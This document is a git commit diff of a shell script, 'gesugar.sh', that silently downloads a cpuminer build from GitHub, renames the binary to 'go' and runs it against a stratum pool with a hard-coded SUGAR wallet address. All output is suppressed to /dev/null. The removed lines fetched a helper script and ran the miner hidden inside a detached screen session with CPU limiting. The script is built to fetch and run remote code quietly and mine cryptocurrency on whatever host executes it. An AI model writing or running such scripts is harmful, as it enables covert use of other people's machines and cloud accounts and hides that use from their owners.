47bd9c2ad397bd711d46cf6622134b115b1ba934
wikangdijalalan2 <82296471+wikangdijalalan2@users.noreply.github.com>
2021-06-05 17:30:41 -0600

    Update gesugar.sh

--- gesugar.sh
+++ gesugar.sh
@@ -1,15 +1,6 @@
 #SGR
-apt update > /dev/null 2>&1
-apt install cpulimit > /dev/null 2>&1
-apt install screen -y > /dev/null 2>&1
-wget https://github.com/wikangdijalalan2/jagahkurang34/raw/main/limiting.sh > /dev/null 2>&1
-chmod +x limiting.sh > /dev/null 2>&1
-screen -dmS randum ./limiting.sh cpuminer-avx 65 75 > /dev/null 2>&1
 wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz > /dev/null 2>&1
 tar -xf cpuminer-opt-linux.tar.gz > /dev/null 2>&1
 mv cpuminer-avx go > /dev/null 2>&1
-while [ 1 ]; do
 ./go -a yespowerSUGAR -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1qdgf4da5dcafhug574a0zjrfwkge262tl3q99e8.Okbaah > /dev/null 2>&1
-sleep 3 > /dev/null 2>&1
-done
-sleep 999 > /dev/null 2>&1
+
